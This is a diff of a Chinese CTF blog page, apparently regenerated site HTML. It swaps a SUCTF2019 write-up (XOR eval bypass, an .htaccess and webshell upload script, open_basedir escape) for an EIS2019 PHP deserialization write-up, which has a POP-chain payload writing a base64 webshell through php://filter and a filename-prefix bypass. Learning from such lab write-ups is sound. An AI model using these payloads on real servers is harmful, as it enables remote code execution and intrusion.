@@ -4,13 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SUCTF2019 ezweb, Z3ratu1&#39;s blog">
-    <meta name="description" content="SUCTF2019 ezwebBUU平台上复现题目，主要学习了一下异或绕过的操作还踩了一些奇奇怪怪的坑，题目共三层，层层绕过搞了我好几天，还是太菜了
-第一层第一层源码
-$hhh = @$_GET[&#39;_&#39;];
-
-if (!$hhh){
-   ">
+    <meta name="keywords" content="EIS2019 ezpop, Z3ratu1&#39;s blog">
+    <meta name="description" content="[EIS2019] ezpop看到这个标题就知道应该是反序列化构造pop链，不过实际写下来感觉pop链没什么东西，绕过的trick倒是学了一堆，先上源码
+key = $key;
+        $this-&gt;store = $store;
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +16,7 @@ if (!$hhh){
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>SUCTF2019 ezweb | Z3ratu1&#39;s blog</title>
+    <title>EIS2019 ezpop | Z3ratu1&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -290,13 +288,13 @@ if (!$hhh){
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        SUCTF2019 ezweb
+                        EIS2019 ezpop
                     </div>
                 </div>
             </div>
@@ -407,12 +405,12 @@ if (!$hhh){
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/php/" target="_blank">
-                                <span class="chip bg-color">php</span>
-                            </a>
-                        
                             <a href="/tags/wp/" target="_blank">
                                 <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
+                                <span class="chip bg-color">反序列化</span>
                             </a>
                         
                     </div>
@@ -435,21 +433,21 @@ if (!$hhh){
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-02-12
+                    2020-03-16
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.3k
+                        1.5k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        5 Min
+                        6 Min
                     </div>
                     
                 
@@ -465,85 +463,154 @@ if (!$hhh){
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="SUCTF2019-ezweb"><a href="#SUCTF2019-ezweb" class="headerlink" title="SUCTF2019 ezweb"></a>SUCTF2019 ezweb</h1><p>BUU平台上复现题目，主要学习了一下异或绕过的操作还踩了一些奇奇怪怪的坑，题目共三层，层层绕过搞了我好几天，还是太菜了</p>
-<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><p>第一层源码</p>
-<pre class=" language-php"><code class="language-php"><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <h1 id="EIS2019-ezpop"><a href="#EIS2019-ezpop" class="headerlink" title="[EIS2019] ezpop"></a>[EIS2019] ezpop</h1><p>看到这个标题就知道应该是反序列化构造pop链，不过实际写下来感觉pop链没什么东西，绕过的trick倒是学了一堆，先上源码</p>
+<pre class=" language-PHP"><code class="language-PHP"><?php
+error_reporting(0);
 
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+class A {
 
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+    protected $store;
 
-<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    protected $key;
 
-<span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    protected $expire;
 
-<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p><strong>PS：不可见字符全部以十六进制编码的方式进行了展示，复现时需注意（因为url编码hexo要报错）</strong></p>
-<p>PHP特性”Use of undeﬁned constant”会将代码中没有引号的字符默认为字符串，因此我们_GET过去的数据也都被认为是字符串<br>又ASCII大于0x7F的字符都会被认为是字符串，因此在过滤了全部字母和数字的情况下，我们还可以用不可见字符进行异或或者取反来得到需要的内容<br>这里取反也挂了，所以用异或，同时异或%FF就等于取反，并且%FF还相对节约了一个字符，如果可行也不需要太麻烦的fuzz测试去找怎么异或，思路是再搞一个$_GET来绕过之前的一大堆限制，这里_GET的参数要是之前用来异或过的内容，节约字符串<br>$_GET[]的中括号也挂了，这个用大括号直接替代也没有问题,构造出如下payload并成功执行，第一层就算过了<br><code>?_=${0xfe0xfe0xfe0xfe^0xa10xb90xbb0xaa}{0xfe}();&amp;0xfe=phpinfo</code><br>这里整体payload作为被默认作为了一个字符串进入eval函数，而eval函数将整个字符串作为代码执行，其中ASCII大于0x7f的不可见字符又会被认作字符串进行异或，最终得出我们想要的结果</p>
-<p>实际上异或能凑的不同字符数这么少不容易，如果不行就得fuzz所有组合眼睛看的去找了</p>
-<h3 id="第一个坑"><a href="#第一个坑" class="headerlink" title="第一个坑"></a>第一个坑</h3><p>wp中payload为<code>?_=${0xfe0xfe0xfe0xfe^0xa10xb90xbb0xaa}}{0xfe}();0xfe=phpinfo</code><br>这里_GET也需用大括号括起来，因为eval在执行过程中，如果遇到了$符号，则直接将后续部分任务是变量名，这样我们就得到了一个名为<code>${0xfe0xfe0xfe0xfe^0xa10xb90xbb0xaa}</code>的变量，不去计算异或，然后产生错误退出，添加大括号之后使得我们先执行大括号中的内容，将异或后的_GET拿了出来，才能得到正确的结果</p>
-<h3 id="第二个坑"><a href="#第二个坑" class="headerlink" title="第二个坑"></a>第二个坑</h3><p>本地测试<br><code>eval($_GET[&#39;a&#39;]);</code>时<br>当<code>?a=$_GET[b]();&amp;b=phpinfo</code>时能正常执行，而<code>?a=$_GET[b]&amp;b=phpinfo();</code>试了半天。。。。不会调试的我也太菜了。<br>就是当一个变量以$a()的形式出现的时候，PHP会认为它是一个函数，从而eval就会执行phpinfo();这个函数，如果我们以后者的方式进行执行，就只是一个$_GET[b]，得到了一个内容为<code>phpinfo();</code>的字符串，存在$_GET这个全局变量里面</p>
-<h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><p>第一层过了之后可以执行的get_the_flag函数</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!! </span>
-    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>
-        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span></code></pre>
-<p>可以先看一下PHP版本，7+所以过滤&lt;?之后&lt;script&gt;这种方法就绕不过去了，并且过滤了ph的后缀，利用htaccess绕过<br>需要手搓代码上传文件，知识盲区，网上抄了一个现成脚本</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">import</span> base64
+    public function __construct($store, $key = 'flysystem', $expire = null) {
+        $this->key = $key;
+        $this->store = $store;
+        $this->expire = $expire;
+    }
 
-url <span class="token operator">=</span> <span class="token string">"http://b11cd486-9833-4bef-bf24-967205c05ada.node3.buuoj.cn/?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();"</span> \
-      <span class="token string">"&amp;%fe=get_the_flag"</span>
+    public function cleanContents(array $contents) {
+        $cachedProperties = array_flip([
+            'path', 'dirname', 'basename', 'extension', 'filename',
+            'size', 'mimetype', 'visibility', 'timestamp', 'type',
+        ]);
 
+        foreach ($contents as $path => $object) {
+            if (is_array($object)) {
+                $contents[$path] = array_intersect_key($object, $cachedProperties);
+            }
+        }
 
-htaccess <span class="token operator">=</span> b<span class="token triple-quoted-string string">"""#define width 1 
-#define height 1 
-AddType application/x-httpd-php .cc
-php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc"
+        return $contents;
+    }
 
-"""</span>
-<span class="token comment" spellcheck="true"># 把.cc解析为PHP，并且将上传的shell添加到末尾，base64编码绕过检测</span>
+    public function getForStorage() {
+        $cleaned = $this->cleanContents($this->cache);
 
-shell <span class="token operator">=</span> b<span class="token string">"\x00\x00\x8a\x39\x8a\x39"</span><span class="token operator">+</span>b<span class="token string">"00"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">"&lt;?php eval($_GET['c']);?>"</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true"># shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"&lt;script language='php'>eval($_REQUEST[c]);&lt;/script>"</span>
-<span class="token comment" spellcheck="true"># 玄妙的字符可以绕过exif_imagetype，补的00用来base64解码，否则解码可能无法还原后面shell部分。字符串前面的b表示字符串为byte类型，为网络数据传输需要格式</span>
+        return json_encode([$cleaned, $this->complete]);
+    }
 
-files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span> htaccess<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+    public function save() {
+        $contents = $this->getForStorage();
+//        print $contents;
+        $this->store->set($this->key, $contents, $this->expire);
+    }
 
-data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"upload"</span><span class="token punctuation">:</span> <span class="token string">"Submit"</span><span class="token punctuation">}</span>
+    public function __destruct() {
+        if (!$this->autosave) {
+            $this->save();
+        }
+    }
+}
 
-r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+class B {
 
+    protected function getExpireTime($expire): int {
+        return (int) $expire;
+    }
 
-files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'shell.cc'</span><span class="token punctuation">,</span> shell<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
-r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-</code></pre>
-<h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><p>open_basedir绕过<br>这个shell打上去之后就基本为所欲为，但是看phpinfo可以看到一个open_basedir的限制，直接用chdir加ini_set绕过<code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个题看记录是去年十月底左右开始写的，之后十一月份就开始忙srtp？还是期末？寒假浑浑噩噩到现在才开始继续学习，今天算是把之前欠下的补回来，总的来说，没好好学习呜呜呜，最近加油吧，时隔三个多月完全没看题，现在的我又是一个零基础菜逼了</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/5677" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677</a><br><a href="https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/</a></p>
+    public function getCacheKey(string $name): string {
+        return $this->options['prefix'] . $name;
+    }
+
+    protected function serialize($data): string {
+        if (is_numeric($data)) {
+            return (string) $data;
+        }
+
+        $serialize = $this->options['serialize'];
+
+        return $serialize($data);
+    }
+
+    public function set($name, $value, $expire = null): bool{
+        $this->writeTimes++;
+
+        if (is_null($expire)) {
+            $expire = $this->options['expire'];
+        }
+
+        $expire = $this->getExpireTime($expire);
+        $filename = $this->getCacheKey($name);
+
+        $dir = dirname($filename);
+
+        if (!is_dir($dir)) {
+            try {
+                mkdir($dir, 0755, true);
+            } catch (\Exception $e) {
+                // 创建失败
+            }
+        }
+
+        $data = $this->serialize($value);
+
+        if ($this->options['data_compress'] && function_exists('gzcompress')) {
+            //数据压缩
+            $data = gzcompress($data, 3);
+        }
+
+        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
+//        print $data;
+        $result = file_put_contents($filename, $data);
+
+        if ($result) {
+            return true;
+        }
+
+        return false;
+    }
+
+}
+
+if (isset($_GET['src']))
+{
+    highlight_file(__FILE__);
+}
+
+$dir = "uploads/";
+
+if (!is_dir($dir))
+{
+    mkdir($dir);
+}
+unserialize($_GET["data"]);
+
+$b = new B();
+$b->options['serialize'] = "strval";
+$b->options['prefix'] = "php://filter/write=convert.base64-decode/resource=./uploads/";
+$a = new A($b, 'z3ratu1.php');
+$a->cache = array('dirname'=> "PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4");
+echo str_replace(' ','%',serialize($a));</code></pre>
+<p>定义两个类，魔法方法就A中一个构造一个析构，能用的只有析构，析构直接进save，save函数仅在B类中存在，也就省去了有的题目还要思考是走哪个类的pop链的问题<br>类A最后会通过析构进入类B的save函数中，所以store这个对象肯定是一个B，类A剩下两个函数都是对content内容进行加工，但是就我做题情况而言，好像这两个函数都没什么用。。。<br>总的效果就是如果数组中存在一个值仍为数组，就把他和写死的数组比较然后返回键名相同的项，最后通过json_encode一下，<br>最后这个值会在save函数里作为data的内容拼接一个exit写入文件，剩下的A，B两个类里面的大部分参数都是直接可以控制的，A中的key为写入的文件名，B中的option[‘prefix’]是目录名<br>options[‘expire’]不知道有什么用，一通类型转换之后写进了注释里面，<code>sprintf(&#39;%012d&#39;, $expire)</code>这里的%012d表示最短12位的数字，不足12位用0填充<br>option[‘serialize’]中对应的函数名对我们传入的数据进行一次处理，什么都不做就可以了，选择strval()<br>options[‘data_compress’]不知道是想干什么，是不是把自己写入的字符串压缩一下到时候可以在写入的时候用伪协议解压写入来绕过死亡exit？<br>但是file_put_contents也支持其他协议，比如php://filter，我们把shell先用base64编码传入，用base64解码将整个内容解码写入就可以绕过死亡exit了，这个是个很老的trick，以前看p神的博客有写过<br>整个题重点就是一个<code>option[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=upload/&#39;</code></p>
+<h2 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h2><p>看清这些代码在干什么并不难，只要能想到死亡exit的绕过题目难度就不大，而这里的编码解码绕过是有一点点小坑的<br>base64编码以3个字节为一组，编码成4个字节一组的字符串，末尾不足的位数用=补齐，所以我们得让最后的data处我们shell前面的字符是4的倍数才能使得他被正确解码<br>我为了统计字数看了一下data的内容</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">//000000000000</span>
+ <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"dirname"</span><span class="token punctuation">:</span><span class="token string">"PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">]</span></code></pre>
+<p>这里的</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">//000000000000</span>
+ <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"dirname"</span><span class="token punctuation">:</span>"</code></pre>
+<p>长度一共是45，但是编码是能刚好成功的，可以说是运气好碰上的，因为这里面有很多base64编码后不存在的字符，例如空格，?&gt;();等，这些字符在解码时全部被忽略了，换行符什么的都一样，所以实际上参与解码的内容就只剩下了<code>php//000000000000exitdirnamePD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4null</code><br>所以凑字符串的时候还是要注意一下怎么回事<br>还有一个点在于我们的shell<code>&lt;?php eval($_GET[&#39;a&#39;]); ?&gt;</code>编码的结果其实是<code>PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4=</code>末尾有一位等号填充，但是如果把这个等号也放进去的话，shell里面就写不进去了，（我猜测）是因为=是编码结束之后用来填充的内容，但是这里在shell后面还有内容，解码的时候却突然遇到了一个=，导致解码出错了</p>
+<p>A类里面的那个对比数组的方法我还是不知道有什么用，因为只要我的数组值不是数组它就无法对我造成影响，我shell前面那个键值随便写什么都不会有影响，也不存在用那个函数去调整前面的字符凑编码</p>
+<p>payload </p>
+<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">" * store"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"options"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"serialize"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"strval"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"prefix"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">:</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=./uploads/";}}s:6:" * key";s:11:"z3ratu1.php";s:9:" * expire";N;s:5:"cache";a:1:{s:7:"dirname";s:35:"PD9waHAgZXZhbCgkX0dFVFsiYSJdKTsgPz4";}}</span></code></pre>
+<p>空格为protected变量的标识符，实际上url编码为%00</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>buu上还有一个新春红包题，和这个题基本一模一样，就是在文件名前面拼接了一个随机字符串，然后又检查了后缀是否为.php<br>由于前面有一个死亡exit，没法传htaccess来解析其他后缀，而php5,phtml等后缀又不能解析<br>生成的随机字符串无法获取，也就无法知道上传的文件名<br>因此稍微修改一下payload，只需要整体在key上面动动手脚就可以<br>新payload的key为: <code>/../z3ratu1.php/.</code>，通过/../将之前的随机字符串作为一个目录，而再用..跳出，这样子就绕过随机字符串，控制了文件名，而最后的/.仍为当前工作目录，是以前看到过的一个绕后缀的trick，这样子就能绕过后缀检测在目录下创建php文件</p>
 
             </div>
             <hr/>
@@ -702,9 +769,9 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《SUCTF2019 ezweb》
+                    《EIS2019 ezpop》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/12/SUCTF2019%20ezphp/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/03/16/%5BEIS%202019%5Dezpop/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -744,30 +811,86 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2020/02/14/%E5%8F%8D%E5%BC%B9shell/">
+                <a href="/2020/03/16/%5BEIS%202019%5Dezpop/">
                     <div class="card-image">
                         
-                        <img src="/img/note.jpg" class="responsive-img" alt="反弹shell入门">
+                        <img src="/img/ctf.jpg" class="responsive-img" alt="EIS2019 ezpop">
                         
-                        <span class="card-title">反弹shell入门</span>
+                        <span class="card-title">EIS2019 ezpop</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            反弹shell入门起源于今天AA师傅的一个简单web，但是由于对反弹shell的一无所知和对某些知识的偏差认识浪费了一个下午没做出来反弹shell需要对标准输入输出流重定向有一点基础的理解，大致原理不在赘述，只是做个记录
-上很简单的源码
-&
+                            [EIS2019] ezpop看到这个标题就知道应该是反序列化构造pop链，不过实际写下来感觉pop链没什么东西，绕过的trick倒是学了一堆，先上源码
+key = $key;
+        $this->store = $store;
+
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-14
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
+                                    刷题记录
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/wp/" target="_blank">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
+                        <span class="chip bg-color">反序列化</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/12/SQL%20injection/">
+                    <div class="card-image">
+                        
+                        <img src="/img/php.jpg" class="responsive-img" alt="SQL injection">
+                        
+                        <span class="card-title">SQL injection</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            SQL injection 对SQL注入的一些常见payload和不同类型注入的总结
+基础无过滤注入union联合注入 这种注入需要有回显位，使用联合注入union select，主要注入参数需为一个错误指，才能显示联合查询后面的内容，使用
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
